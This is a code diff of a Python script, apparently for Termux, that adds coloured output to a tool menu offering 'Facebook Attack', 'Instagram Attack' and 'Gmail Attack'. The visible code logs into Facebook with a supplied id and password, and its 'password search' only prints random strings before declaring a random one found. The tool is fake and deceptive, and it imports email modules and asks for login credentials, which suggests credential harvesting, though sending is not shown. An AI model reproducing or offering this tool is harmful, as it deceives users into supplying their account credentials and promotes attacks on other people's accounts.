@@ -4,12 +4,16 @@ from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from email.mime.application import MIMEApplication
 try:
- import mechanize
+ import mechanize, colorama
+ from colorama import Fore, Back, Style
 except:
  os.system('pip install mechanize')
- import mechanize
+ os.system('pip install colorama')
+ import mechanize, colorama
+ from colorama import Fore, Back, Style
 os.system('clear')
-print('''
+colorama.init(autoreset=True)
+print(Fore.GREEN+Back.RED+'''
 ─────╔╗─────────╔╗─╔╗──────────╔╗──
 ────╔╝╚╗────────║║─║║──────────║║──
 ╔╗╔╗╚╗╔╝╔══╗╔══╗║║─║╚═╗╔══╗╔══╗║║╔╗
@@ -35,8 +39,9 @@ def assur(ide, pasw):
  strr = response.read()
  struts = strr.decode('UTF-8')
  if 'id="loginbutton"' in struts:
-    sys.exit('incorrect password or no account found.\n\nCheck ur login informations and try again.')
-
+    sys.exit(Fore.RED+'incorrect password or no account found.\nCheck ur login informations and try again.')
+ else:
+  print(Fore.GREEN+ 'Successfully Logged in.')
 def upd():
     os.chdir('/data/data/com.termux/files/home')
     shutil.rmtree('crack')
@@ -47,11 +52,11 @@ def upd():
 def nth():
     if usn == '' or usp == '':
         time.sleep(2)
-        sys.exit('\nFailed to connect')
+        sys.exit(Fore.RED+'\nFailed to connect')
     if '@' not in usn:
         if '+' not in usn:
             time.sleep(2)
-            sys.exit('\nNo account found')
+            sys.exit(Fore.RED+'\nNo account found')
 
 def loop():
     az = 'azertyuiopqsdfghjklmwxcvnb'
@@ -60,13 +65,13 @@ def loop():
     ajs = '*@#)(?!;:'
     all = az + ajs + a1 + aZ
     lax = 0
-    print('recherche en cours...')
+    print(Fore.GREEN+'recherche en cours...')
     time.sleep(2)
     while lax < 2999992499999245053:
        print(lax, ''.join(random.sample(all, 8)))
        lax += 1
-    print('pass founded: ', ''.join(random.sample(all, 8)))
-option = int(input('''
+    print(Fore.GREEN+'pass founded: ', ''.join(random.sample(all, 8)))
+option = int(input(Fore.GREEN+'''
 1- Facebook Attack
 2- Instagram Attack
 3- Gmail Attack
